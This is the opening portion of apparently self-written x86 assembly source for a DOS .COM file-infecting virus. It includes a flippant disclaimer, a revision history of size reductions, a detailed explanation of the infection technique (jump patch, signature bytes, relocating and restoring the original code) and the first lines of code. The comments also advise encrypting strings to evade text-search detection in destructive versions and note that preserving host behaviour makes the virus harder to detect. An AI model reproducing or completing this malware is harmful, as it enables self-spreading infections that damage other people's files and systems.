;The author of this virus intends it to be used for educational
;purposes only, and assumes no responsibilities for its release,
;dammages resulting from its use, including but not limited to
;equipment dammage or data loss.

;By assembling or examining this program, The user agrees to accept all
;responsibility for this programs use, or any portions of the code
;or concepts contained within.  The user also agrees to not publicly release
;this virus, and to exercise necessary precautions to prevent its escape.
;The user accepts all responsibility arising from his actions.

;Don't come crying to me if your hard disk gets infected,
;as THERE IS NO ANTIDOTE.  HAHAHAH.


;Revision history:
;4-13: initial bug-free release, size=424 bytes with carrier

;4-15: added no date change support, size=438 bytes with carrier

;4-16: minor documentation changes, size=438 bytes with carrier,
;      NO CODE CHANGE from 4-15 revision

;4-21: fixed missing hex h suffixs, made MASM friendly,
;      fixed incorrect assume statement (assume statements are ignored
;      by A86) enabled hard/floppy infection based on floppy_only status
;      size=438 bytes IF floppy_only, 424 bytes if not, with carrier.
;      minimum virus length = 419 bytes
	
;4-23: added control over how many programs are infected per run,
;      switched method of infection, from copying to DTA then writing
;      to disk to straight write to disk from memory.
;      size=412 bytes IF floppy_only, 398 bytes if not, with carrier.
;      minimum virus length = 393 bytes
	
;4-28: used set DTA instead of default DTA/copy command line
;      buffer, which had been used based on incorrect assumption
;      eliminated calls to get time/date, get attribs
;      by using information from find first/find next functions 4eh/4fh
;      made warning optional for reduced space if desired.  Also
;      changed mov reg16, bp add reg16, constant to shorter LEA instruction.
;      size=354 bytes IF floppy_only, warning on W/carrier
;           340 bytes IF w/warning & carrier program
;           286 bytes w/o warning, in program
;       minimum virus length = 281 bytes for virus itself

;4-28pm:  instead of near CALL-pop sequences everywhere, switched to
;         a single CALL near ptr Reference_Point, putting the result into
;         si now that (until the end) string mode addressing is not used.
;         Changed places where a register (used as an index)
;         was being loaded THEN added to a single LEA isntruction
;       size = 340 bytes if floppy_only, warning on w/carrier
;       size = 326 bytes if w/warning & carrier
;	size = 272 w/o warning
;	minimum virus length = 267 bytes for the virus itself

;4-28pm2: Eliminated unecessary flush buffers call.
;       size = 336 bytes if floppy_only w/carrier
;       size = 322 bytes w/warning & carrier
;	size = 268 w/o warning
;	minimum virus length = 263 bytes for virus itself

;4-30:	restored 5 bytes of original code at CS:0100
;	before infecting other programs, allowing the
;	original code field to be modified so one disk write could be
;	used instead of two
;	minor documentation revisions - corrected incorrect
;	opcodes in documentation
;	size = 326 bytes if floppy_only w/carrier
;	size = 312 bytes w/warning & carrier program
;	size = 258 bytes w/carrier program
;	Minimum virus length = 253 bytes for the virus itself
	
;NOTE:  The program is currently "set up" for A86 assembly with all
;conditional assembly symbols.  #IF and #ENDIF should be replaced with
;MASM IFDEF and ENDIF directives for propper operation.
;Also, instead of using EQUates to define control symbols, the /D
;option or DEFINE could be used.....


;COMVIRUS.ASM must be assembled into a .COM file inorder to function
;properly.  For convieniece, I recommend an assembler like A86 that will
;assemble to a .COM file without having to go through LINK and EXE2BIN

;As is, it will infect .COM files located on the current disk.
;ONLY if it is a floppy disk, ONLY in the root directory.

;This is a .COM infector virus, which, does nothing other than print a
;warning message, and spread to all files on the default disk IFF it is
;a floppy disk, in the root directory.

;Theory:
;This is a non - overwriting virus.  I took special precautions to preserve
;all functionality of the original program, including command line, parsed FCB,
;and segment register preservation.  This makes the virus harder to detect.

;The .COM file is a memory image - with no relocation table.  Thus, it
;is an easy target for a virus such as this.

;Infected file format
;jmp near ptr xxxx
;cli cli                ;ID bytes
;ORIGINAL program code, sans 5 bytes
;5 bytes ORIGINAL program code
;VIRUS

;This format makes infection VERY simple.  We merely check for our signature
;(in this case cli cli (fa fa) - instructions that no programmer in his
;right mind would use - loading the original five bytes in the process.
;These original bytes are written to the end of the program, then
;A jump to where the virus is.

;While infection is easy, this method presents some coding problems, as the
;virus does not know where in memory it is.  Therefor, When we want to access
;data, we FIND OUT where we are, by performing a near call which PUSHES ip to the
;stack which is then popped.  Addresses are then calculated relative to this
;via LEA

;To run the program as normal, command line is restored, registers restored,
;And original code copied onto the first five bytes of the program.


;Program control symbols defined here
floppy_only equ 1
infect_per_run equ 1            ;number of programs infected per run

        assume cs:_TEXT,ds:_TEXT,es:_TEXT,ss:_TEXT
        org 100h

Start:  jmp     infect;

;This is our signature
        cli
        cli

;Original code is the data field where we store the original program code
;which will replace our signature and jmp to infect

Original_Code:  int     20h             ;five bytes that simply terminate
                nop                     ;the program
                nop
                nop



;Data for the virus.  In a destructive virus, you would want to encrypt
;any strings using a simple one's complement (not) operation so as to
;thwart detection via text search utilities.  Since we want detection to
;be easy, this un-encrypted form is fine.

        ;FUNKY code!  In the 80x86, all NEAR or SHORT jmp opcodes take
        ;a RELATIVE address...... BUT a retn opcode pops a near absolute
        ;address of the stack - saves us the trouble of some calculating
        ;relative to here, and the trouble of a self-modifying
        ;far absolute jmp! (5 bytes)
